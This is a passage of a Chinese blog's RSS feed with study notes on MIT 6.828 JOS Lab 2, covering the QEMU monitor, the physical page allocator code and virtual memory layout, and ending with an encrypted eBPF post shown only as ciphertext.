      <content:encoded><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>通过GDB我们只能通过虚拟地址来查看内存所存放的内容，但是如果能访问到物理内存的话，肯定会更有帮助的。们可以看一下QEMU中的一些常用指令，特别是xp指令，可以允许我们去访问物理内存地址。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>由于官方给的进入moniter的方式在我这不好使，用如下命令进入：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qemu-system-i386 -hda obj&#x2F;kern&#x2F;kernel.img -monitor stdio -gdb tcp::26000 -D qemu.log  </span><br></pre></td></tr></table></figure><p>　  打开monitor后，我们可以输入如下比较常见的指令：</p><p>　　xp/Nx paddr – 查看paddr物理地址处开始的，N个字的16进制的表示结果。</p><p>　　info registers – 展示所有内部寄存器的状态。</p><p>　　info mem – 展示所有已经被页表映射的虚拟地址空间，以及它们的访问优先级。</p><p>　　info pg – 展示当前页表的结构。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13837151323/0" alt="image-20210801162042097"></p><p>然后是我们的虚拟地址空间</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13837152481/0" alt="image-20210801162103534"></p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/08/01/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise3/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT 6.828】Lab2-Exercise1</title>
      <link>https://billyotry.github.io/2021/07/30/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise1/</link>
      <guid>https://billyotry.github.io/2021/07/30/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise1/</guid>
      <pubDate>Fri, 30 Jul 2021 08:41:44 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;在文件 kern/pmap.c 中，你必须要完成以下几个子函数的代码&lt;/p&gt;
&lt;p&gt;boot_alloc();  mem_init();  
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>在文件 kern/pmap.c 中，你必须要完成以下几个子函数的代码</p><p>boot_alloc();  mem_init();  page_init();   page_alloc();   page_free();</p><p>check_page_free_list()和check_page_alloc()两个函数将会检测你写的页分配器代码是否正确。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这部分我们需要写一个物理内存页的allocator。要求实现kern/pmap.c文件中的boot_alloc()，mem_init()，page_init()，page_alloc()，page_free()。check_page_free_list()和check_page_alloc()中会有一些测试用例，如果没有通过两个函数则说明代码有问题。</p><p>从lab1中我们知道，进入内核后首先调用的是i386_init函数，然后我们查看该函数，它会调用mem_init函数。然后mem_init函数又会调用其他的工具函数实现内核的内存管理。该函数首先调用i386_detect_memory函数来计算有多少物理内存页保存到npages和npages_basemem两个全局变量中，npages记录整个内存的页数，npages_basemem记录basemem的页数。</p><p>之前我们介绍过了，jos把整个物理内存划分成了三个部分：</p><ol><li>0x00000~0xA0000，这部分叫basemem，是可用的。</li><li>0xA0000~0x100000，这部分叫IO hole，是不可用的，主要用来被分配给外部设备。</li><li>0x100000~xxx，这部分就是0x100000往上的空间了，叫做extmem，是可用的，是最重要的内存区域。</li></ol><p>执行完这个函数之后，下两条指令是</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kern_pgdir = (<span class="keyword">pde_t</span> *) boot_alloc(PGSIZE);</span><br><span class="line"><span class="built_in">memset</span>(kern_pgdir, <span class="number">0</span>, PGSIZE);</span><br></pre></td></tr></table></figure><p>其中kern_pgdir是一个指针，pde_t *kern_pgdir是一个指向操作系统页目录表的指针，操作系统之后工作在虚拟内存模式下，就需要这个页目录表进行地址转换。我们为这个页目录表分配的内存空间大小为一页大小，然后把这部分内存清空。</p><p>这里调用了boot_alloc函数，这个是我们首要实现的函数了，该函数就如注释中所说，它只是暂时当作页分配器，之后使用的真实的页分配器是page_alloc函数。</p><p>boot_alloc函数的核心思想就是维护一个静态变量nextfree，里面存放着下一个可以使用的空闲内存空间的虚拟地址，所以当我们每次想要分配n个字节的内存时，我们都需要修改这个变量的值。</p><p>所以添加代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">result = nextfree;</span><br><span class="line">nextfree = ROUNDUP((nextfree + n),PGSIZE);</span><br><span class="line"><span class="keyword">if</span>(nextfree - KERNBASE &gt; npages*PGSIZE)&#123;</span><br><span class="line">panic(<span class="string">&quot;Out of memory!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>接下来注释中要求我们分配一块内存，用来存放一个struct PageInfo的数组，数组中的每一个PageInfo代表内存当中的一页。操作系统通过这个数组来追踪所有内存页的使用情况。那么添加如下代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pages = (struct PageInfo*)boot_alloc(npages * <span class="keyword">sizeof</span>(struct PageInfo));</span><br><span class="line"><span class="built_in">memset</span>(pages,<span class="number">0</span>,npages * <span class="keyword">sizeof</span>(struct PageInfo));</span><br></pre></td></tr></table></figure><p>接下来就要调用page_init函数，我们可以到这个函数的定义处具体查看，整个函数大体是由一个for循环构成，遍历所有内存页所对应的在数组中的结构体，并且根据当前页的状态来修改这个结构体的状态，如果页被占用，那么要把这个结构体中的pp_ref置1；如果是空闲页，则把这个页表送入到pages_free_list页表中。根据注释中的提示，第0页已经被占用，io hole部分被占用，extmem也有部分已经被占用，所以添加代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//mark page 0 as in use --1</span></span><br><span class="line">pages[<span class="number">0</span>].pp_ref = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//[PGSIZE,npages_basemem*PGSIZE) is avilable --2</span></span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>;i &lt; npages_basemem;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//[IOPHYSMEM, EXTPHYSMEM) is never be allocated --3</span></span><br><span class="line"><span class="keyword">for</span>(;i&lt;EXTPHYSMEM/PGSIZE;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//[EXTPHYSMEM, ...) --4</span></span><br><span class="line"><span class="comment">//in this part,we need to know which pages has been used for pages-table or page-directory or kernel</span></span><br><span class="line"><span class="keyword">physaddr_t</span> lasted_in_use_address = PADDR(boot_alloc(<span class="number">0</span>));</span><br><span class="line"><span class="keyword">size_t</span> last_number = lasted_in_use_address/PGSIZE;</span><br><span class="line"><span class="keyword">for</span>(;i&lt;last_number;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//other pages for free</span></span><br><span class="line"><span class="keyword">for</span>(;i &lt; npages;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化关于所有物理内存页的相关数据结构后，进入check_page_free_list(1)子函数，这个函数的功能就是检查page_free_list链表的所谓空闲页，是否真的都是合法的，空闲的。接下来调用check_page_alloc函数，所以我们要实现page_alloc和page_free函数。</p><p>通过注释我们可以知道知道这个函数的功能就是分配一个物理页，然后返回值就是这个物理页对应的PageInfo结构体。</p><p>首先我们可以知道我们所用到的结构如下图：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13835464680/0" alt="image-20210731234539766"></p><p>然后我们的page_alloc的实现如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *</span></span><br><span class="line"><span class="class"><span class="title">page_alloc</span>(<span class="title">int</span> <span class="title">alloc_flags</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">result</span> =</span> page_free_list;</span><br><span class="line"><span class="comment">//cprintf(&quot;result = %lx\n&quot;,result);</span></span><br><span class="line"><span class="keyword">if</span>(!page_free_list)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">page_free_list = result-&gt;pp_link;</span><br><span class="line">result-&gt;pp_link = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(alloc_flags&amp;ALLOC_ZERO)&#123;</span><br><span class="line"><span class="built_in">memset</span>(page2kva(result),<span class="number">0</span>,PGSIZE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是我们的page_free函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">page_free(struct PageInfo *pp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="comment">// Hint: You may want to panic if pp-&gt;pp_ref is nonzero or</span></span><br><span class="line"><span class="comment">// pp-&gt;pp_link is not NULL.</span></span><br><span class="line"><span class="keyword">if</span>(pp-&gt;pp_link || pp-&gt;pp_ref)&#123;</span><br><span class="line">panic(<span class="string">&quot;page_free: pp-&gt;pp_ref is nonzero or pp-&gt;pp_link is not NULL&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">pp-&gt;pp_link = page_free_list;</span><br><span class="line">page_free_list = pp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新回到mem_init()的流程中来，在调用page_init()后，会调用check_page_free_list(1)和check_page_alloc()。这两个函数通过一系列断言，判断我们的实现是否符合预期。需要注意的是check_page_free_list()中的这段代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (only_low_memory) &#123;</span><br><span class="line"><span class="comment">// Move pages with lower addresses first in the free</span></span><br><span class="line"><span class="comment">// list, since entry_pgdir does not map all pages.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp1</span>, *<span class="title">pp2</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> **<span class="title">tp</span>[2] =</span> &#123; &amp;pp1, &amp;pp2 &#125;;</span><br><span class="line"><span class="keyword">for</span> (pp = page_free_list; pp; pp = pp-&gt;pp_link) &#123;</span><br><span class="line"><span class="keyword">int</span> pagetype = PDX(page2pa(pp)) &gt;= pdx_limit;</span><br><span class="line">*tp[pagetype] = pp;</span><br><span class="line">tp[pagetype] = &amp;pp-&gt;pp_link;</span><br><span class="line">&#125;<span class="comment">//执行该for循环后，pp1指向（0~4M）中地址最大的那个页的PageInfo结构。pp2指向所有页中地址最大的那个PageInfo结构</span></span><br><span class="line">*tp[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">*tp[<span class="number">0</span>] = pp2;</span><br><span class="line">page_free_list = pp1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里主要就是调整page_free_list链表的顺序，从我之前的图就能知道之前链表的顺序是从高地址到低地址分配的，现在调整后分配顺序就可以从低地址到高地址了。</p><blockquote><p>提一点就是现在映射的都是物理地址的0到0x100000映射到虚拟地址0xf0100000往后。</p></blockquote><p>附一张物理内存布局图</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab2/lab2_2_physical_memory_after_pages.png" alt="执行mem_init()后的物理内存"></p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/07/30/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise1/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT 6.828】JOS学习笔记 Lab2</title>
      <link>https://billyotry.github.io/2021/07/30/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab2/</link>
      <guid>https://billyotry.github.io/2021/07/30/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab2/</guid>
      <pubDate>Fri, 30 Jul 2021 01:39:54 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;lab2中多出来了几个文件：&lt;/p&gt;
&lt;p&gt;inc/memlayout.h&lt;/p&gt;
&lt;p&gt;kern/pmap.c&lt;/p&gt;
&lt;p&gt;kern/pmap.h&lt;/p&gt;
&lt;p&gt;kern/kclock.h&lt;/p&gt;
&lt;p&gt;kern/kclock.c&lt;/p&gt;
&lt;p&gt;memlayout.h描
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>lab2中多出来了几个文件：</p><p>inc/memlayout.h</p><p>kern/pmap.c</p><p>kern/pmap.h</p><p>kern/kclock.h</p><p>kern/kclock.c</p><p>memlayout.h描述了虚拟地址空间的布局，我们需要通过修改pmap.c文件来实现这个结构。memlayout.h和pmap.h文件定义了一个PageInfo结构，利用这个结构可以记录哪些物理页是空闲的。kclock.c和kclock.h文件中操作的是用电池充电的时钟，以及CMOS RAM设备。在这个设备中记录着PC机拥有的物理内存的数量。在pmap.c中的代码必须读取这个设备的信息才能弄清楚到底有多少内存。</p><h2 id="Part-1-Physical-Page-Management"><a href="#Part-1-Physical-Page-Management" class="headerlink" title="Part 1: Physical Page Management"></a>Part 1: Physical Page Management</h2><p>操作系统必须要追踪记录哪些物理内存区域是可用的，哪些是被占用的。JOS内核以页(page)为最小粒度来管理内存的，它使用MMU来映射，保护每一块被分配出去的内存。</p><p>在这里要具体编写一个物理内存页的分配子函数。它利用一个结构体PageInfo的链表来记录哪些页是空闲的，链表中的每一个节点对于一个物理页。我们需要先编写物理页面分配器，然后才能编写虚拟内存实现，因为页表管理自身也需要分配物理内存来存储页表。</p><h2 id="Part-2-Virtual-Memory"><a href="#Part-2-Virtual-Memory" class="headerlink" title="Part 2: Virtual Memory"></a>Part 2: Virtual Memory</h2><h3 id="Virtual-Linear-and-Physical-Addresses"><a href="#Virtual-Linear-and-Physical-Addresses" class="headerlink" title="Virtual, Linear, and Physical Addresses"></a>Virtual, Linear, and Physical Addresses</h3><p>在x86体系中，一个虚拟地址是由两部分组成，一个是段选择子，另一个是段内偏移。一个线性地址指的是通过段地址转换机制把虚拟地址转换之后得到的地址。一个物理地址指的是分页地址机制把线性地址进行转换之后得到的真是的内存地址，这个地址最终将会送到内存芯片的地址总线上。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">           Selector  +--------------+         +-----------+</span><br><span class="line">          ----------&gt;|              |         |           |</span><br><span class="line">                     | Segmentation |         |  Paging   |</span><br><span class="line">Software             |              |--------&gt;|           |----------&gt;  RAM</span><br><span class="line">            Offset   |  Mechanism   |         | Mechanism |</span><br><span class="line">          ----------&gt;|              |         |           |</span><br><span class="line">                     +--------------+         +-----------+</span><br><span class="line">            Virtual                   Linear                Physical</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在boot/boot.S文件中，我们引入了一个全局描述符表，这个表通过把所有段的基址设置为0，界限设置为0xffffffff的方式，关闭了分段的功能，所以虚拟地址中的选择子的部分就完全没有了意义，那么线性地址中的值就总是等于虚拟地址中段内偏移的值。在lab1中已经安装了一个简易的页目录和页表，将虚拟地址[0, 4MB)映射到物理地址[0, 4MB)，[0xF0000000, 0xF0000000+4MB)映射到[0, 4MB），这个页表仅仅映射了4MB的内存，在我们的JOS系统中，我们希望能拓展到物理内存的头256MB空间上，并且把这部分物理空间映射到从0xf0000000开始的虚拟空间中，以及一些其他的虚拟地址空间中。</p><p>一旦进入了保护模式，我们就不能直接使用线性地址或者物理地址了。所有代码中的地址的引用都是虚拟地址的形式，然后被MMU系统所转换，所有C语言中的指针都是虚拟地址。</p><p>JOS内核通常需要把地址按照以一种模糊的值或者整数值的形式来操纵，而不是直接解析引用，比如物理内存分配器。有时使用虚拟地址，有时使用物理地址。为了能够帮助我们记录代码，JOS源文件中的地址被区分为两种情况：</p><p>　　uintptr_t – 表示虚拟地址</p><p>　　physaddr_t – 表示物理地址</p><p>这两种类型其实都是32位的整型数(uint32_t)，所以如果你把一个类型的变量的值赋给另一个类型变量，编译器不会报错。但是由于他们都是整型数，所以如果你打算解引用(deference)他们，编译器会报错。</p><p>JOS内核可以先对uintptr_t类型的值进行强制类型转换，然后再解析引用。但是对于physaddr_t的值，我们不能这么做，因为内核是需要MMU（内存管理单元）来首先对你输入的地址进行转化的，如果你对physaddr_t进行强制类型转换再解引用，最终你得到的你要访问的地址，可能不是你要找的真实物理地址。</p><p>所以</p><p><img src="https://images2015.cnblogs.com/blog/809277/201603/809277-20160316103653162-1590673802.png" alt="img"></p><blockquote><p><strong>Question</strong></p><p>假设下面的JOS内核代码是正确的，变量x应该是什么类型的，uintptr_t还是physaddr_t？</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mystery_t</span> x;</span><br><span class="line"><span class="keyword">char</span>* value = return_a_pointer();</span><br><span class="line">*value = <span class="number">10</span>;</span><br><span class="line">x = (<span class="keyword">mystery_t</span>) value;</span><br></pre></td></tr></table></figure><p>应该是uintptr_t。第三句对*value进行了赋值，所以value肯定是一个虚拟地址，因为直接解引用物理地址是没有意义的。那么x肯定也是虚拟地址，要不然将虚拟地址赋值给一个物理地址也没有意义的。</p></blockquote><p>JOS内核有时需要读取或者修改内存，但是这时有可能他只知道这个要被修改的内存的物理地址。举个例子，当我们想要加入一个新的页表项的时时，我们需要分配一块物理内存来存放页目录项，然后初始化这块内存。然而，内核，它是不能绕过 虚拟地址转换 这一步的，因而它也不能直接加载或者存储物理地址。那么我们如何把物理地址转换为虚拟地址，我们可以采用KADDR(pa)指令来获取。其中pa指的是物理地址。同样的，如果想通过虚拟地址的值求得物理地址的值，我们可以采用PADDR(va)指令。</p><h3 id="Reference-counting"><a href="#Reference-counting" class="headerlink" title="Reference counting"></a>Reference counting</h3><p>在之后的实验中，将会经常遇到一种情况，多个不同的虚拟地址被映射到相同的物理页上。这时我们需要记录一下每一个物理页上存在着多少不同的虚拟地址来引用它，这个值存放在这个物理页的PageInfo结构体的pp_ref成员中，当这个值为0时，这个物理页才可以被释放。通常来说，任意一个物理页的pp_ref值等于它所在的页表项中，被位于虚拟地址UTOP之下的虚拟页所映射的次数(UTOP之上的地址范围在启动的时候已经被映射完成了，之后不会被改动)。当我们使用page_alloc函数的时候需要注意。它所返回的页的引用计数值总是0，所以pp_ref应该被马上加一。</p><h3 id="Page-Table-Management"><a href="#Page-Table-Management" class="headerlink" title="Page Table Management"></a>Page Table Management</h3><p>现在我们可以着手开始编写管理页表的程序了：包括插入删除线性地址到物理地址的映射关系，以及创建页表等等。</p><h2 id="Part-3-Kernel-Address-Space"><a href="#Part-3-Kernel-Address-Space" class="headerlink" title="Part 3: Kernel Address Space"></a>Part 3: Kernel Address Space</h2><p>JOS把32位的线性地址虚拟空间分为两个部分。其中用户环境(进程运行环境)通常占据低地址的那部分，叫用户地址空间。而操作系统内核总是占据高地址的部分，叫内核地址空间。这两个部分的分界线是定义在memlayout.h文件中的一个宏ULIM。JOS为内核保留了256MB左右的虚拟地址空间，</p><h3 id="Permissions-and-Fault-Isolation"><a href="#Permissions-and-Fault-Isolation" class="headerlink" title="Permissions and Fault Isolation"></a>Permissions and Fault Isolation</h3><p>由于内核和用户进程只能访问各自的地址空间，所以我们必须在x86页表中使用访问权限位(Permission Bits)来使用户进程的代码只能访问用户地址空间，而不是内核地址空间。否则用户代码中的一些错误可能会覆写内核中的数据，最终导致内核的崩溃。</p><p>处在用户地址空间中的代码不能访问高于ULIM的地址空间，但是内核可以读写这部分空间。而内核和用户对于地址范围[UTOP, ULIM]有着相同的访问权限，那就是可以读取但是不可以写入。这一个部分的地址空间通常被用于把一些只读的内核数据结构暴露给用户地址空间的代码。在UTOP之下的地址范围是给用户进程使用的，用户进程可以访问，修改这部分地址空间的内容。</p><h3 id="Initializing-the-Kernel-Address-Space"><a href="#Initializing-the-Kernel-Address-Space" class="headerlink" title="Initializing the Kernel Address Space"></a>Initializing the Kernel Address Space</h3><p>现在我们要设置一下UTOP之上的地址空间：这也是整个虚拟地址空间中的内核地址空间部分。inc/memlayout.h文件中已经向你展示了这部分地址空间的布局。你可以使用你刚刚编写的函数来设置这些地址的布局。</p><blockquote><p><strong>Question</strong></p><p>1.到目前为止页目录表中已经包含多少有效页目录项？他们都映射到哪里？</p><p>3BD号页目录项，指向的是kern_pgdir</p><p>3BC号页目录项，指向的是pages数组</p><p>3BF号页目录项，指向的是bootstack</p><p>3C0~3FF号页目录项，指向的是kernel</p><p>2.我们已将内核和用户环境放在同一地址空间中。 为什么用户程序无法读取或写入内核的内存？ 哪些特定机制保护内核内存？</p><p>用户程序不能随意修改内核中代码，数据，否则可能会破坏内核，造成程序崩溃。</p><p>正常的操作系统通常采用两个部件来完成对内核地址的保护，一个是通过段机制来实现的，但是JOS中的分段功能并没有实现。二就是通过分页机制来实现，通过把页表项中的 Supervisor/User位置0，那么用户态的代码就不能访问内存中的这个页。</p><p>3.这个操作系统的可以支持的最大数量的物理内存是多大？</p><p>由于这个操作系统利用一个大小为4MB的空间UPAGES来存放所有的页的PageInfo结构体信息，每个结构体的大小为8B，所以一共可以存放512K个PageInfo结构体，所以一共可以出现512K个物理页，每个物理页大小为4KB，自然总的物理内存占2GB</p><p>4.回顾entry.S文件中，当分页机制开启时，寄存器EIP的值仍旧是一个小的值。在哪个位置代码才开始运行在高于KERNBASE的虚拟地址空间中的？当程序位于开启分页之后到运行在KERNBASE之上这之间的时候，EIP的值是小的值，怎么保证可以把这个值转换为真实物理地址的？</p><p>在entry.S文件中有一个指令 jmp *%eax，这个指令要完成跳转，就会重新设置EIP的值，把它设置为寄存器eax中的值，而这个值是大于KERNBASE的，所以就完成了EIP从小的值到大于KERNBASE的值的转换。在entry_pgdir这个页表中，也把虚拟地址空间[0, 4MB)映射到物理地址空间[0, 4MB)上，所以当访问位于[0, 4MB)之间的虚拟地址时，可以把它们转换为物理地址。</p></blockquote><h3 id="Address-Space-Layout-Alternatives"><a href="#Address-Space-Layout-Alternatives" class="headerlink" title="Address Space Layout Alternatives"></a>Address Space Layout Alternatives</h3><p>进程的虚拟地址空间的布局不是只有我们讨论的这种唯一的情况，我们也可以把内核映射到低地址处。但是JOS之所以要这么做，是为了保证x86的向后兼容性。只要我们能够仔细设计，虽然很难，但是我们也能设计出来一种内核的布局方式，使得进程的地址空间就是从0到4GB，无需为内核预留一部分空间，但是仍然能够保证，用户进程不会破坏操作系统的指令，数据。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>大体上做了三件事：</p><ol><li><p>提供管理物理内存的数据结构和函数，如下：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab2/lab2_7_%E6%80%BB%E7%BB%93_%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86.png" alt="JOS物理内存管理"></p></li><li><p>提供修改页目录和页表的函数，从而达到虚拟页和物理页的映射的目的：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab2/lab2_8_%E6%80%BB%E7%BB%93_%E9%A1%B5%E8%A1%A8%E7%AE%A1%E7%90%86%E5%87%BD%E6%95%B0.PNG" alt="JOS页表管理"></p></li><li><p>用前面两部分的函数建立内核的线性地址空间。内核的线性地址空间到物理内存的映射可总结为下图：</p></li></ol><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab2/lab2_5_lab2%E5%90%8E%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E5%88%B0%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E6%98%A0%E5%B0%84.png" alt="JOS内核线性地址空间按"></p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/07/30/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab2/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【eBPF】Overview</title>
      <link>https://billyotry.github.io/2021/07/28/%E3%80%90eBPF%E3%80%91Overview/</link>
      <guid>https://billyotry.github.io/2021/07/28/%E3%80%90eBPF%E3%80%91Overview/</guid>
      <pubDate>Wed, 28 Jul 2021 13:56:10 GMT</pubDate>
      <description>
      
        Here&#39;s something encrypted, password is required to continue reading.
      
      </description>
      
      
      <content:encoded><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fd43914a7a4b48ea9b1544ca548e8a027c8279f74e54fadb25bd468a772066b1">60c8fb4a25acc80be70b6eda0913804634b0eab35fd83bcfcaa9879cf933cfe4d23ea146798578d753de426c9106acc8a16649dc7535f4180445923d9930e4b129413e04e3de1b8e1f0b5ddfc600489c0bb66ada6368c35183af01bf7ed78b5c650bc08236b6439a7097a1bd5284ddfad1efd00db10a32cc9febb14e8cbfc5c32087c22ae2c0b5183923a757e7c196529184ce917d46c1cc3a6f580f8c069b0227133d55457f1935be53618ba722691472ea0462d510f095c1b76a71b848081efbf6f4b2959b5b7fb1a6055844f28742b27b3ea2894e7d3085851a50a8c9a55b6b83ba85a1ec790999a3ff175a71431c35008eb233e47d7b644705b3ef4c4ba14decc15ff9f146c1e0fb321ecdbaecf9ff30e7f72a4e063c7091b1f8bb66dbb97ab26e5002919bd7b1e37cf6d4966c93ded5fc7698f10d5c8a5c0c126fded1c25a48cd34f5296af66d2995e413817fba0495f1cec3e93143a84fc8efd04b4afde2de9905b8d24476cdea508d8cdaa7826397434ee14bea64a48e1daa1a3345bb3de9c1e03a4ea1bcc1083eb638c13eaa6c3bef02e6c68cc74de1d5520de96952a20a9b2e704c7525e9f0454eb0abbad84460e47e9fc2562ff016f6d87125b6fbde36ba9e5dfca54177e5736a5fd4b4fd8776ab419fb81472bfa31a33319f97740f396e9a2b319e86f2bf19cbbe4140fa13220140b786ef97bf4ee72a34d9c4ae9e2a86ae1cb6613e59ce108e0953a4bd2eb9d5c7aab7239489abcc232120e1a334c8a266bfb0908e66c76c01272dde79a4c38e0b24d7f103d2284d8f3907c5cd41271572c0bb8e0613bdf20a8845e9cbbb8be31eb9b21bc3b7f3bdb72a7766af56db3038c5efccc85ddee130ad8aaec710f419091113af779f78ef10c623b816c5cbfa459009192c6433dcb017bb73dd586657c6b6d93255d1f6c315da1683886777379b294b140092bcc020c486b12b15cabe66bc3d07c77da8fde8ad42c155565ee81ba20620e16811556bce94a1a544d72f852a7db3208ff993ab09a63b727b04f0632cfc975c29acd4d0d45ee1ce23ee61a81bfa95c60be81bb4930e32423bbdbf4c873d2f4c90dbcb1fa2a45a82a0dfa6830c0055aa89dc7b3bce1201774a9d15c3149251d5499ede1b1fcc08a877843eac16b18dd818987ce10c0cf460e495eaee0ff56fda3e8756afc5f3717e1fd90c592ee69187225e89a997b3cdfbab5836c4ea66aacdf69b86a67350c457f6cc06d2b8d52a99a8f5bb88f87024f3f8614b8f9e27cb9fb47191e152c2159093c42a275334ed9f674885bfb52b359a22748448b55bdebb72c70b678218f212975401ca2e12233e758c422ec17d3bfcc5cc50eb53a4af9a62be1f56e1d82377deadaa03ec0a3bb0bde1859345bef10dfea4a55f32481587c02fa8b7eaf89ad6d0d09b6410d4d5512a4ce992788c837d4c5acd64b0f968461a17862f144629f3293818c303c3e4e583c504f2006f7e6fd3b4e1ab8557ebe0ebf0a1d64a80cb951ce76bab6bec0d20e45e968cea4669f5bc6a376665388d0c68ce82619a08c627ed9091dd3a15627764937b7c3586dc7fb2e32e12c03e931143e6d97610be422355c162c128a376ce6e03b081d153c67e0bf0bfdadef9c3121b1b828bf502bf34db0ebed5441030e6a5489e0911d6f72cc55d6ae61804d503a89f5785c102055c682935b84e76eeb858d3eabd178f1d7f3e6bcdac7dad2c9e5a1bf3cd023dd5edb7aec3059b926c34a3be82ee2b38fdf73e2cf00546174fbe0621f748ae89428ec41fad5aec9710c1ac6b7876d29dc430333fad4d0f6f991585189d90f02dc291743d0ed532a98a7e9fa7c39b318aee4c0e94da89a7e327df7799fda2370c778f06945b90d13c17ad38d2715f3774cd58698a54efbfaa6f9afb542061a89f996285bbc50e97eb1fde22a658d36313a19e8b7633d9dcde0295d9c041d1ffa2f94dba8acb317aef87065cdd646b7875b0161e65f4e6a511281d049633339c87b4df5794633db2c4e8c27756f8efe8579e8eddd3b8093acae27c9a8a8ae5b655292e514333003cc05bde56e6910a3608b0b5edfa7c244295691944b5f507aafd300428cb3d895ffda9029b01ebdf2b1238bd6b785e1f2b1dc833aa8cf223667a5477ae22f46483d70a17bb71f371cc5d11cc5f87a2b182859f6b97b4e28c7f35227d124864819db52b7698ab7731df47c59c76d13b4a4955506c4b3b90a4908739bb21d344eff2e3fbaa28bc1d8f68415f831fbe46604e1974d1fc41b1f58122216ad7b1a13ccdd0f786996f269913bf97fa254f2556a768636ae0f9767ef1bcc98c7cf8bb333de16dce3b744ddc